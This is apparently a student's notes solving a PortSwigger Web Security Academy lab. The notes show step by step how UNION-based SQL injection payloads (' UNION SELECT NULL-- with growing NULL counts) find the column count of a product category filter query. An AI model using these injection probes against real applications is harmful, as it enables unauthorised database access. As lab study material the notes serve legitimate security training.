
# #PortSwigger 


![[Pasted image 20251212220753.png]]


## Lab Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query.

**Objective:** Determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

---
---


### Step 1: Capture the Category Filter Request

1. In Burp's browser, access the lab
2. Click on a product category filter (e.g., "Gifts")
3. In Burp Proxy, find the request

**Example request:**
```
GET /filter?category=Gifts HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```


---

### Step 2: Test Column Count with UNION SELECT

**Start with 1 column:**
```
GET /filter?category=' UNION SELECT NULL-- HTTP/1.1
```

**Response:** Error --> Not enough columns.

**Try 2 columns:**
```
GET /filter?category=' UNION SELECT NULL,NULL-- HTTP/1.1
```

**Response:** Error --> Still not enough.

**Try 3 columns:**
```
GET /filter?category=' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
```


![[Pasted image 20251212220806.png]]

**Response:** Success!! Response contains additional row with null values.


---

### Step 3: Lab Solved

![[Pasted image 20251212220825.png]]


---
----


